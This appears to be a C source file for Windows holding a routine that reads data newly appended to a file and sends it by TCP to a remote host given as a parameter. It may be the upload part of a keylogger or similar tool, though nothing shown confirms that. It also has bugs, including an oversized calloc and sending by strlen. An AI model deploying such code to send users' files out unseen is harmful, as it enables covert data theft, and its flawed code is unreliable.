#include "../inc/uploader.h"

BOOL sendToSocket(PSTR szBuf, PSTR host, PSTR port, BOOL con);

BOOL diffReaderUploader(HANDLE file, PSTR host, PSTR port, BOOL con)
{
    PSTR szBuf;
    LARGE_INTEGER liCurFilePtr = {0};
    static LARGE_INTEGER liPrevFilePtr = {0};

    LARGE_INTEGER liZero = {0};
    GetFileSizeEx(file, &liCurFilePtr);
    SetFilePointerEx(file, liPrevFilePtr, NULL, FILE_BEGIN);

    if (liCurFilePtr.QuadPart != liPrevFilePtr.QuadPart)
    {
        LONGLONG bufSize = liCurFilePtr.QuadPart - liPrevFilePtr.QuadPart;
        if (bufSize < 0)
            return 0;

        DWORD bytesRead;
        szBuf = calloc(bufSize, bufSize);
        if (szBuf == NULL)
            return 0;

        BOOL bSucces = ReadFile(file, szBuf, bufSize, &bytesRead, NULL);
        if (!bSucces)
        {
            free(szBuf);
            return 0;
        }
        if (sendToSocket(szBuf, host, port, con))
            liPrevFilePtr = liCurFilePtr;
            
        free(szBuf);
        return 1;
    }
    return 0;
}

BOOL sendToSocket(PSTR szBuf, PSTR host, PSTR port, BOOL con)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    int iResult = 0;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        if (con)
            fprintf(stderr, "WSAStartup faild with error: %d\n", iResult);
        return 0;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0)
    {
        if (con)
            printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 0;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                               ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET)
        {
            if (con)
                printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 0;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
    {
        if (con)
            printf("Unable to connect to server!\n");
        WSACleanup();
        return 0;
    }

    iResult = send(ConnectSocket, szBuf, (int)strlen(szBuf), 0);
    if (iResult == SOCKET_ERROR)
    {
        if (con)
            printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 0;
    }

    closesocket(ConnectSocket);
    WSACleanup();

    return 1;
}